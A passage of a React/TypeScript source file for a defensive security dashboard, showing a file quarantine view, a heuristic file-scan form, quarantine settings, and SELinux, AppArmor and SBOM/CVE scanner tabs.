                      <div style={{ fontSize:10, color:"#666", fontFamily:"monospace", marginBottom:4 }}>
                        📁 <span style={{ color:"#888" }}>Original:</span> <span style={{ color:"#aaa" }}>{e.originalPath}</span>
                      </div>
                      {e.downloadedFrom && (
                        <div style={{ fontSize:9, color:"#555", fontFamily:"monospace", marginBottom:4 }}>
                          🌐 Downloaded from: <span style={{ color:"#ff9900" }}>{e.downloadedFrom}</span>
                        </div>
                      )}
                      {e.detectionReason && (
                        <div style={{ fontSize:9, color:"#666", fontFamily:"monospace", background:"#111", borderRadius:4, padding:"4px 8px", border:`1px solid ${SEV[e.severity]??"#333"}22` }}>
                          🔬 {e.detectionReason}
                        </div>
                      )}
                    </div>
                    <div style={{ fontSize:9, color:"#333", fontFamily:"monospace", textAlign:"right", marginLeft:12 }}>
                      {new Date(e.detectedAt).toLocaleString()}<br/>
                      {e.fileHash && <span title={e.fileHash}>SHA256: {e.fileHash.substring(0,16)}…</span>}
                    </div>
                  </div>

                  {/* Row 2 — Quarantine path */}
                  <div style={{ background:"#050505", border:"1px solid #1a1a1a", borderRadius:5, padding:"5px 10px", fontFamily:"monospace", fontSize:8, color:"#444", marginBottom:10 }}>
                    🔒 Quarantine path: <span style={{ color:"#555" }}>{e.quarantinePath}</span>
                  </div>

                  {/* Row 3 — Action buttons */}
                  {e.status === "quarantined" && (
                    <div style={{ display:"flex", gap:8, alignItems:"center", flexWrap:"wrap" }}>
                      <button
                        onClick={()=>doAction(e.id,"delete")}
                        disabled={pendingAction===e.id}
                        style={{ background:"#ff444422", border:"1px solid #ff444444", borderRadius:6, padding:"6px 16px", fontFamily:"monospace", fontSize:11, color:"#ff4444", cursor:"pointer", fontWeight:700 }}>
                        🗑 Delete Permanently
                      </button>
                      <button
                        onClick={()=>doAction(e.id,"restore")}
                        disabled={pendingAction===e.id}
                        style={{ background:"#00ff8822", border:"1px solid #00ff8844", borderRadius:6, padding:"6px 16px", fontFamily:"monospace", fontSize:11, color:"#00ff88", cursor:"pointer", fontWeight:700 }}>
                        ↩ Restore to Original Location
                      </button>
                      <button
                        onClick={()=>doAction(e.id,"allow")}
                        disabled={pendingAction===e.id}
                        style={{ background:"#4488ff22", border:"1px solid #4488ff44", borderRadius:6, padding:"6px 16px", fontFamily:"monospace", fontSize:11, color:"#4488ff", cursor:"pointer", fontWeight:700 }}>
                        ✅ Mark Safe &amp; Allow
                      </button>
                      <input
                        value={actionNote[e.id]??""}
                        onChange={ev=>setActionNote(p=>({...p,[e.id]:ev.target.value}))}
                        placeholder="Add note (optional)..."
                        style={{ flex:1, minWidth:160, background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
                    </div>
                  )}
                  {e.status !== "quarantined" && (
                    <div style={{ display:"flex", gap:8, alignItems:"center" }}>
                      <div style={{ fontSize:10, color:"#555", fontFamily:"monospace" }}>
                        {e.status === "deleted" && "🗑 Permanently deleted from quarantine container"}
                        {e.status === "restored" && "↩ Restored to original path"}
                        {e.status === "allowed" && "✅ Marked as safe — allowed to execute"}
                      </div>
                      {e.userNote && <span style={{ fontSize:9, color:"#444", fontFamily:"monospace" }}>Note: {e.userNote}</span>}
                      <button onClick={()=>doAction(e.id,"quarantined")} style={{ marginLeft:"auto", background:"#ffaa0022", border:"1px solid #ffaa0044", borderRadius:5, padding:"4px 12px", fontFamily:"monospace", fontSize:9, color:"#ffaa00", cursor:"pointer" }}>Re-quarantine</button>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* ── SCAN FILE ── */}
      {activeView === "scan" && (
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16 }}>
            <div style={{ fontFamily:"monospace", fontWeight:800, fontSize:13, color:"#fff", marginBottom:12 }}>🔍 Scan File for Threats</div>
            <div style={{ background:"#111", border:"1px solid #ff660022", borderRadius:6, padding:"8px 12px", fontSize:10, color:"#666", fontFamily:"monospace", marginBottom:14 }}>
              Heuristic engine checks: executable in temp directories · double extension tricks (file.pdf.exe) · macro-enabled Office docs (Emotet/QBot vectors) · suspicious download sources (Pastebin, MediaFire, AnonFiles) · unusually large scripts · file hash lookups
            </div>
            <div style={{ display:"flex", flexDirection:"column", gap:8, marginBottom:12 }}>
              <label style={{ fontSize:10, color:"#555", fontFamily:"monospace" }}>File Path</label>
              <input value={scanForm.filePath} onChange={e=>setScanForm(p=>({...p,filePath:e.target.value}))} placeholder="/home/user/Downloads/file.exe  or  C:\Users\User\Downloads\file.exe" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"8px 12px", fontFamily:"monospace", fontSize:11, color:"#ccc" }}/>
              <label style={{ fontSize:10, color:"#555", fontFamily:"monospace" }}>Downloaded From (optional)</label>
              <input value={scanForm.downloadedFrom} onChange={e=>setScanForm(p=>({...p,downloadedFrom:e.target.value}))} placeholder="https://pastebin.com/..." style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"8px 12px", fontFamily:"monospace", fontSize:11, color:"#ccc" }}/>
            </div>
            <button onClick={doScan} disabled={scanning||!scanForm.filePath} style={{ width:"100%", background:scanning||!scanForm.filePath?"#111":"#ff660022", border:`1px solid ${scanning||!scanForm.filePath?"#2a2a2a":"#ff660044"}`, borderRadius:6, padding:"10px", fontFamily:"monospace", fontSize:12, color:scanning||!scanForm.filePath?"#444":"#ff6600", cursor:scanning||!scanForm.filePath?"not-allowed":"pointer", fontWeight:700 }}>
              {scanning ? "⌛ Scanning..." : "🔍 Scan File"}
            </button>
          </div>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16 }}>
            <div style={{ fontFamily:"monospace", fontWeight:800, fontSize:13, color:"#fff", marginBottom:12 }}>Scan Result</div>
            {!scanResult && <div style={{ color:"#333", fontFamily:"monospace", fontSize:11, padding:"40px 0", textAlign:"center" }}>No scan performed yet</div>}
            {scanResult && !scanResult.detected && (
              <div style={{ textAlign:"center", padding:"30px 0" }}>
                <div style={{ fontSize:40 }}>✅</div>
                <div style={{ fontFamily:"monospace", fontSize:14, fontWeight:700, color:"#00ff88", marginTop:10 }}>File is Clean</div>
                <div style={{ fontSize:11, color:"#444", marginTop:8 }}>{scanResult.message}</div>
              </div>
            )}
            {scanResult && scanResult.detected && (
              <div style={{ background:"#0f0505", border:"2px solid #ff444444", borderRadius:8, padding:16 }}>
                <div style={{ fontSize:32, textAlign:"center", marginBottom:8 }}>🚨</div>
                <div style={{ fontFamily:"monospace", fontSize:14, fontWeight:700, color:"#ff4444", textAlign:"center", marginBottom:12 }}>THREAT DETECTED — File Quarantined</div>
                <div style={{ display:"flex", justifyContent:"center", gap:8, marginBottom:12 }}>
                  <Bdg label={scanResult.threatName ?? "Unknown"} color="#ff4444" sm/>
                  <Bdg label={(scanResult.severity ?? "medium").toUpperCase()} color={SEV[scanResult.severity ?? "medium"]??"#ff4444"} sm/>
                </div>
                <div style={{ background:"#111", borderRadius:6, padding:"8px 12px", fontSize:10, color:"#ff9900", fontFamily:"monospace" }}>🔬 {scanResult.reason}</div>
                <div style={{ marginTop:12, fontSize:10, color:"#555", fontFamily:"monospace", textAlign:"center" }}>
                  File moved to quarantine. Go to the Quarantine Container to take action.
                </div>
              </div>
            )}
            <div style={{ marginTop:20 }}>
              <div style={{ fontSize:10, color:"#444", fontFamily:"monospace", marginBottom:8 }}>Quick Scan Examples (high-risk patterns)</div>
              {[
                { path:"/tmp/update.sh",                      from:"https://pastebin.com/raw/abc" },
                { path:"C:\\Users\\User\\Downloads\\doc.pdf.exe", from:""                          },
                { path:"/home/user/Downloads/Invoice.xlsm",   from:"https://sendspace.com/abc"   },
              ].map((ex,i)=>(
                <button key={i} onClick={()=>setScanForm({filePath:ex.path,downloadedFrom:ex.from})} style={{ display:"block", width:"100%", textAlign:"left", background:"#111", border:"1px solid #2a2a2a", borderRadius:5, padding:"6px 10px", fontFamily:"monospace", fontSize:9, color:"#555", cursor:"pointer", marginBottom:4 }}>
                  {ex.path}{ex.from && ` ← ${ex.from.substring(0,40)}`}
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ── SETTINGS ── */}
      {activeView === "settings" && settings && (
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16 }}>
            <div style={{ fontFamily:"monospace", fontWeight:800, fontSize:13, color:"#fff", marginBottom:14 }}>⚙️ Quarantine Settings</div>
            <div style={{ display:"flex", flexDirection:"column", gap:10 }}>
              <div>
                <label style={{ fontSize:10, color:"#555", fontFamily:"monospace", display:"block", marginBottom:4 }}>Container Path</label>
                <input defaultValue={settings.containerPath} onBlur={async e=>{ await qPut("/settings",{containerPath:e.target.value}); await reload(); }} style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc", boxSizing:"border-box" }}/>
              </div>
              <div>
                <label style={{ fontSize:10, color:"#555", fontFamily:"monospace", display:"block", marginBottom:4 }}>Max Container Size (MB)</label>
                <input type="number" defaultValue={settings.maxContainerSizeMb} onBlur={async e=>{ await qPut("/settings",{maxContainerSizeMb:parseInt(e.target.value)}); await reload(); }} style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc", boxSizing:"border-box" }}/>
              </div>
              <div>
                <label style={{ fontSize:10, color:"#555", fontFamily:"monospace", display:"block", marginBottom:4 }}>Auto-delete After (days)</label>
                <input type="number" defaultValue={settings.retentionDays} onBlur={async e=>{ await qPut("/settings",{retentionDays:parseInt(e.target.value)}); await reload(); }} style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc", boxSizing:"border-box" }}/>
              </div>
            </div>
          </div>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16 }}>
            <div style={{ fontFamily:"monospace", fontWeight:800, fontSize:13, color:"#fff", marginBottom:14 }}>Intercept Options</div>
            <div style={{ display:"flex", flexDirection:"column", gap:10 }}>
              {([
                { key:"scanOnDownload",    label:"Scan on Download",          desc:"Intercept files as they're downloaded" },
                { key:"scanOnOpen",        label:"Scan on Open/Execute",      desc:"Block files before they open" },
                { key:"autoQuarantine",    label:"Auto-Quarantine Threats",   desc:"Automatically move threats to container" },
                { key:"notifyOnDetection", label:"Alert on Detection",        desc:"Show notification when threat caught" },
                { key:"scanArchives",      label:"Scan Inside Archives",      desc:"Scan contents of .zip/.7z/.tar files" },
                { key:"scanMacros",        label:"Block Macro Documents",     desc:"Block all macro-enabled Office docs" },
              ] as { key: keyof QSettings; label: string; desc: string }[]).map(({ key, label, desc }) => (
                <div key={key} style={{ display:"flex", alignItems:"center", justifyContent:"space-between", background:"#111", borderRadius:6, padding:"8px 12px" }}>
                  <div>
                    <div style={{ fontFamily:"monospace", fontSize:11, color:"#ccc" }}>{label}</div>
                    <div style={{ fontSize:9, color:"#444" }}>{desc}</div>
                  </div>
                  <button onClick={async()=>{ await qPut("/settings",{[key]:!settings[key]}); await reload(); }} style={{ background: (settings[key] as boolean)?"#00ff8822":"#ff444422", border:`1px solid ${(settings[key] as boolean)?"#00ff8844":"#ff444444"}`, borderRadius:6, padding:"4px 12px", fontFamily:"monospace", fontSize:10, color:(settings[key] as boolean)?"#00ff88":"#ff4444", cursor:"pointer", minWidth:48 }}>
                    {(settings[key] as boolean) ? "ON" : "OFF"}
                  </button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── MILITARY-GRADE + SPYBOT API HELPERS ─────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
const APIFWM = "/api/fwm";
async function fwmPost(path: string, body: unknown) {
  const r = await fetch(`${APIFWM}${path}`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}
async function fwmDelete(path: string) {
  const r = await fetch(`${APIFWM}${path}`, { method:"DELETE" });
  return r.json();
}
function useFwm<T>(path: string) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);
  const reload = useCallback(async () => {
    setLoading(true);
    try { const r = await fetch(`${APIFWM}${path}`); setData(await r.json()); } catch {}
    setLoading(false);
  }, [path]);
  useEffect(() => { void reload(); }, [reload]);
  return { data, loading, reload };
}

// ── Shared Layout Helpers ────────────────────────────────────────────────────
function FwmCard({ children, style }: { children: React.ReactNode; style?: React.CSSProperties }) {
  return <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16, ...style }}>{children}</div>;
}
function SectionTitle({ icon, title, sub, badge, badgeColor, extra }: { icon?: React.ReactNode; title: string; sub?: string; badge?: string; badgeColor?: string; extra?: React.ReactNode }) {
  return (
    <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:14 }}>
      <div style={{ display:"flex", alignItems:"center", gap:8 }}>
        {icon}<span style={{ fontFamily:"monospace", fontWeight:800, fontSize:13, color:"#fff" }}>{title}</span>
        {badge && <Bdg label={badge} color={badgeColor ?? "#4488ff"} sm />}
      </div>
      <div style={{ display:"flex", gap:6, alignItems:"center", fontSize:10, color:"#444" }}>{sub}{extra}</div>
    </div>
  );
}
function InfoBar({ text, color }: { text: string; color?: string }) {
  return <div style={{ background:"#111", border:`1px solid ${color ?? "#1a1a1a"}33`, borderRadius:6, padding:"8px 12px", fontSize:10, color: color ?? "#555", fontFamily:"monospace", marginBottom:12 }}>{text}</div>;
}
type BtnProps = { onClick?: () => void; color?: string; sm?: boolean; disabled?: boolean; style?: React.CSSProperties; children: React.ReactNode };
function Btn2({ onClick, color="#00ff88", sm, disabled, children }: BtnProps) {
  return <button onClick={onClick} disabled={disabled} style={{ background:`${color}22`, border:`1px solid ${color}44`, color, borderRadius:6, padding: sm?"3px 10px":"5px 14px", cursor:disabled?"not-allowed":"pointer", fontSize: sm?10:11, fontFamily:"monospace", opacity:disabled?0.4:1 }}>{children}</button>;
}

// ════════════════════════════════════════════════════════════════════════════
// ── 1. SELinux MAC ENGINE (NSA) ──────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function SelinuxTab() {
  const { data: status, loading, reload } = useFwm<{ liveStatus: Record<string,string>; totalContexts:number; totalDenials:number; reference: Record<string,unknown> }>("/selinux/status");
  const { data: ctxData } = useFwm<{ contexts: Array<{id:number;domain:string;type:string;role:string;level:string;mode:string;enabled:boolean;policy:string|null}> }>("/selinux/contexts");
  const { data: denData } = useFwm<{ denials: Array<{id:number;avcMessage:string;sourceType:string;targetType:string;targetClass:string;permission:string;pid:number|null;comm:string|null;path:string|null;denied:boolean;detectedAt:string}>; total:number }>("/selinux/denials");
  const [avcInput, setAvcInput] = useState("");
  const [parsed, setParsed] = useState<Record<string,unknown> | null>(null);
  const MODE_C: Record<string,string> = { enforcing:"#00ff88", permissive:"#ffaa00", disabled:"#ff4444" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<ShieldCheck size={14} color="#00ff88"/>} title="SELinux MAC Engine — NSA" badge="NSA / Open Source 2000" badgeColor="#ff6600" extra={<Btn2 onClick={async()=>{await fwmPost("/selinux/seed",{}); await reload();}} color="#4488ff" sm>Seed Defaults</Btn2>}/>
        <InfoBar text="Origin: NSA (National Security Agency) — open-sourced 2000 · Mandatory Access Control (MAC) via Type Enforcement (TE) + RBAC + MLS · 3× reduction in privilege escalation (CNCF 2024) · 60% reduction in incidents (Red Hat 2024) · SELinux ioctl restrictions address 59% of kernel vulns" color="#4488ff"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10, marginBottom:12 }}>
          {[{l:"Contexts",v:status?.totalContexts??0,c:"#00ff88"},{l:"AVC Denials",v:status?.totalDenials??0,c:"#ff4444"},{l:"Live Status",v:Object.keys(status?.liveStatus??{}).length,c:"#4488ff"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 6px" }}>
              <div style={{ fontSize:22, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
        {Object.keys(status?.liveStatus??{}).length > 0 && (
          <div style={{ background:"#050f05", border:"1px solid #00ff8822", borderRadius:6, padding:10, marginBottom:10, fontFamily:"monospace", fontSize:10 }}>
            {Object.entries(status?.liveStatus??{}).map(([k,v])=>(
              <div key={k} style={{ display:"flex", gap:8, marginBottom:2 }}>
                <span style={{ color:"#555", minWidth:200 }}>{k}:</span><span style={{ color:"#00ff88" }}>{v as string}</span>
              </div>
            ))}
          </div>
        )}
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<ShieldCheck size={12} color="#4488ff"/>} title="Type Enforcement Contexts" sub={`${ctxData?.contexts?.length??0} contexts`}/>
        {loading ? <div style={{color:"#444",fontFamily:"monospace",fontSize:11}}>Loading...</div> : (
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
            <thead><tr>{["Domain","Type","Mode","Policy","Enabled"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 6px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
            <tbody>{(ctxData?.contexts??[]).map(c=>(
              <tr key={c.id}>
                <td style={{padding:"4px 6px",fontFamily:"monospace",color:"#4488ff"}}>{c.domain}</td>
                <td style={{padding:"4px 6px",fontFamily:"monospace",color:"#aaa",fontSize:9}}>{c.type}</td>
                <td style={{padding:"4px 6px"}}><Bdg label={c.mode.toUpperCase()} color={MODE_C[c.mode]??"#888"} sm/></td>
                <td style={{padding:"4px 6px",color:"#555"}}>{c.policy}</td>
                <td style={{padding:"4px 6px"}}><Bdg label={c.enabled?"ON":"OFF"} color={c.enabled?"#00ff88":"#555"} sm/></td>
              </tr>
            ))}</tbody>
          </table>
        )}
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<AlertTriangle size={12} color="#ff4444"/>} title="AVC Denial Parser" sub="audit2allow integration"/>
        <textarea value={avcInput} onChange={e=>setAvcInput(e.target.value)} placeholder="Paste AVC denial message: type=AVC msg=audit(...)..." style={{ width:"100%", background:"#050f05", border:"1px solid #1a1a1a", borderRadius:6, padding:8, fontFamily:"monospace", fontSize:9, color:"#ccc", minHeight:80, boxSizing:"border-box", marginBottom:8, resize:"vertical" }}/>
        <Btn2 onClick={async()=>{ const r = await fwmPost("/selinux/parse-avc",{avcMessage:avcInput}); setParsed(r); }} color="#ff9900" sm>Parse &amp; Suggest Allow Rule</Btn2>
        {parsed && (
          <div style={{ marginTop:10, background:"#0a0a00", border:"1px solid #ffaa0033", borderRadius:6, padding:10, fontFamily:"monospace", fontSize:9 }}>
            <div style={{ color:"#ffaa00", marginBottom:6 }}>Suggested SELinux Allow Rule:</div>
            <div style={{ color:"#00ff88" }}>{parsed.suggestedAllowRule as string}</div>
            <div style={{ marginTop:8, color:"#555", whiteSpace:"pre-wrap" }}>{parsed.auditAllowCmd as string}</div>
          </div>
        )}
        <div style={{ marginTop:14 }}>
          <div style={{ fontSize:10, color:"#444", marginBottom:6 }}>Recent AVC Denials</div>
          {(denData?.denials??[]).slice(0,5).map(d=>(
            <div key={d.id} style={{ background:"#0f0505", border:"1px solid #ff444422", borderRadius:6, padding:8, marginBottom:6 }}>
              <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
                <span style={{ fontFamily:"monospace", fontSize:10, color:"#ff4444" }}>{d.sourceType} → {d.targetType}:{d.targetClass}</span>
                <Bdg label={d.permission} color="#ff6600" sm/>
              </div>
              {d.comm && <div style={{ fontSize:9, color:"#555" }}>comm={d.comm} {d.path && `path=${d.path}`}</div>}
            </div>
          ))}
        </div>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 2. AppArmor PROFILE MANAGER ────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function ApparmorTab() {
  const { data: status, reload } = useFwm<{ totalProfiles:number; enforced:number; complaining:number; liveStatus:string[]; reference: Record<string,unknown> }>("/apparmor/status");
  const { data: profs } = useFwm<{ profiles: Array<{id:number;name:string;executable:string;mode:string;denialCount:number;enabled:boolean}> }>("/apparmor/profiles");
  const { data: evts } = useFwm<{ events: Array<{id:number;profileName:string;operation:string;requested:string|null;denied:string|null;name:string|null;action:string;detectedAt:string}> }>("/apparmor/events");
  const [genExe, setGenExe] = useState("");
  const [generated, setGenerated] = useState<{profileText:string;installCmd:string}|null>(null);
  const MODE_C: Record<string,string> = { enforce:"#00ff88", complain:"#ffaa00", disabled:"#555", audit:"#4488ff" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Lock size={14} color="#ffaa00"/>} title="AppArmor Profile Manager — Canonical/Ubuntu" badge="Linux Security Module" badgeColor="#ff9900" extra={<Btn2 onClick={async()=>{await fwmPost("/apparmor/seed",{}); await reload();}} color="#4488ff" sm>Seed Defaults</Btn2>}/>
        <InfoBar text="Path-based MAC profiles · Ubuntu default · 70%+ reduction in exploitation risk (Canonical 2024) · CrackArmor (May 2024): 9 confused-deputy CVEs (Qualys) — patch immediately · Kubernetes v1.30: AppArmor native securityContext field" color="#ff9900"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:10 }}>
          {[{l:"Total Profiles",v:status?.totalProfiles??0,c:"#fff"},{l:"Enforcing",v:status?.enforced??0,c:"#00ff88"},{l:"Complaining",v:status?.complaining??0,c:"#ffaa00"},{l:"Live Status Lines",v:status?.liveStatus?.length??0,c:"#4488ff"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 6px" }}>
              <div style={{ fontSize:20, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<ShieldCheck size={12} color="#00ff88"/>} title="Profiles" sub={`${profs?.profiles?.length??0} loaded`}/>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
          <thead><tr>{["Name","Executable","Mode","Denials"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 6px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
          <tbody>{(profs?.profiles??[]).map(p=>(
            <tr key={p.id}>
              <td style={{padding:"4px 6px",fontFamily:"monospace",color:"#fff",fontSize:11}}>{p.name}</td>
              <td style={{padding:"4px 6px",color:"#555",fontSize:9}}>{p.executable}</td>
              <td style={{padding:"4px 6px"}}><Bdg label={p.mode.toUpperCase()} color={MODE_C[p.mode]??"#888"} sm/></td>
              <td style={{padding:"4px 6px",color:p.denialCount>0?"#ff4444":"#444",fontFamily:"monospace"}}>{p.denialCount}</td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Plus size={12} color="#00ff88"/>} title="Profile Generator"/>
        <div style={{ display:"flex", gap:8, marginBottom:8 }}>
          <input value={genExe} onChange={e=>setGenExe(e.target.value)} placeholder="/usr/bin/my-app" style={{ flex:1, background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <Btn2 onClick={async()=>{ const r = await fwmPost("/apparmor/generate",{executable:genExe}); setGenerated(r); }} color="#00ff88" sm>Generate</Btn2>
        </div>
        {generated && (
          <textarea value={generated.profileText} readOnly style={{ width:"100%", background:"#050f05", border:"1px solid #00ff8822", borderRadius:6, padding:8, fontFamily:"monospace", fontSize:8, color:"#aaa", minHeight:180, boxSizing:"border-box", marginBottom:8, resize:"vertical" }}/>
        )}
        {generated && <div style={{ fontFamily:"monospace", fontSize:9, color:"#555", whiteSpace:"pre-wrap" }}>{generated.installCmd}</div>}
        <div style={{ marginTop:12 }}>
          <div style={{ fontSize:10, color:"#444", marginBottom:6 }}>Audit Events</div>
          {(evts?.events??[]).slice(0,5).map(e=>(
            <div key={e.id} style={{ background: e.action==="denied"?"#0f0505":"#050f05", border:`1px solid ${e.action==="denied"?"#ff444422":"#00ff8822"}`, borderRadius:5, padding:7, marginBottom:5 }}>
              <div style={{ display:"flex", justifyContent:"space-between" }}>
                <span style={{ fontFamily:"monospace", fontSize:10, color:"#aaa" }}>{e.profileName} — {e.operation}</span>
                <Bdg label={e.action.toUpperCase()} color={e.action==="denied"?"#ff4444":"#00ff88"} sm/>
              </div>
              {e.name && <div style={{ fontSize:9, color:"#555" }}>{e.name}</div>}
            </div>
          ))}
        </div>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 3. SBOM / NVD CVE SCANNER ────────────────────────────────────════════════
// ════════════════════════════════════════════════════════════════════════════
function SbomTab() {
  const { data: stats, reload } = useFwm<{ totalComponents:number; totalVulns:number; criticalComponents:number; byEcosystem:Record<string,number>; nsaRequirements:string[] }>("/sbom/stats");
  const { data: comps } = useFwm<{ components: Array<{id:number;name:string;version:string;ecosystem:string;purl:string|null;cveCount:number;criticalCves:number;highCves:number;riskScore:number;scannedAt:string}> }>("/sbom/components");
  const { data: vulns } = useFwm<{ vulns: Array<{id:number;componentId:number;cveId:string;severity:string;cvssScore:number|null;description:string|null;fixedIn:string|null}> }>("/sbom/vulns");
  const [scanForm, setScanForm] = useState({ name:"", version:"", ecosystem:"npm" });
  const [scanning, setScanning] = useState(false);
  const [scanResult, setScanResult] = useState<{component:{name:string};vulns:{cveId:string;severity:string;cvssScore:number}[];riskScore:number}|null>(null);
  const scan = async () => { setScanning(true); const r = await fwmPost("/sbom/scan", scanForm); setScanResult(r); setScanning(false); await reload(); };
  const RISK_C = (r:number) => r>=75?"#ff2244":r>=50?"#ff6600":r>=25?"#ffaa00":"#00ff88";
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Database size={14} color="#4488ff"/>} title="SBOM / NVD CVE Scanner — NSA 2024" badge="NIST NVD Live API" badgeColor="#4488ff" extra={<Btn2 onClick={async()=>{await fwmPost("/sbom/seed",{}); await reload();}} color="#4488ff" sm>Seed Examples</Btn2>}/>
        <InfoBar text="NSA 2024 guidance: Evaluate ALL open-source components against NIST NVD before deployment. NTIA SBOM minimum elements required. Real CVE lookups via nvd.nist.gov API. Covers XZ-Utils (CVE-2024-3094), Log4Shell (CVE-2021-44228), PwnKit (CVE-2021-4034)." color="#4488ff"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10 }}>
          {[{l:"Components",v:stats?.totalComponents??0,c:"#fff"},{l:"CVEs Found",v:stats?.totalVulns??0,c:"#ff6600"},{l:"Critical",v:stats?.criticalComponents??0,c:"#ff2244"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 6px" }}>
              <div style={{ fontSize:22, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Search size={12} color="#00ff88"/>} title="Scan Package (NVD Live)"/>
        <div style={{ display:"grid", gridTemplateColumns:"2fr 1fr 1fr", gap:8, marginBottom:10 }}>
          <input value={scanForm.name} onChange={e=>setScanForm(p=>({...p,name:e.target.value}))} placeholder="package name (e.g. lodash)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <input value={scanForm.version} onChange={e=>setScanForm(p=>({...p,version:e.target.value}))} placeholder="version" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <select value={scanForm.ecosystem} onChange={e=>setScanForm(p=>({...p,ecosystem:e.target.value}))} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}>
            {["npm","pip","maven","deb","cargo","gem","go"].map(e=><option key={e}>{e}</option>)}
          </select>
        </div>
        <Btn2 onClick={scan} disabled={scanning || !scanForm.name || !scanForm.version} color="#00ff88" sm>{scanning?"Scanning NVD...":"Scan Package"}</Btn2>
        {scanResult && (
          <div style={{ marginTop:10, background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:6, padding:10 }}>
            <div style={{ display:"flex", justifyContent:"space-between", marginBottom:8 }}>
              <span style={{ fontFamily:"monospace", fontSize:11 }}>{scanResult.component?.name}</span>
              <span style={{ fontFamily:"monospace", fontSize:14, fontWeight:700, color:RISK_C(scanResult.riskScore??0) }}>Risk: {scanResult.riskScore}</span>
            </div>
            {(scanResult.vulns??[]).length===0 ? <div style={{color:"#00ff88",fontSize:11,fontFamily:"monospace"}}>✅ No CVEs found</div> : (scanResult.vulns??[]).map((v:{cveId:string;severity:string;cvssScore:number})=>(
              <div key={v.cveId} style={{ display:"flex", gap:8, alignItems:"center", marginBottom:4 }}>
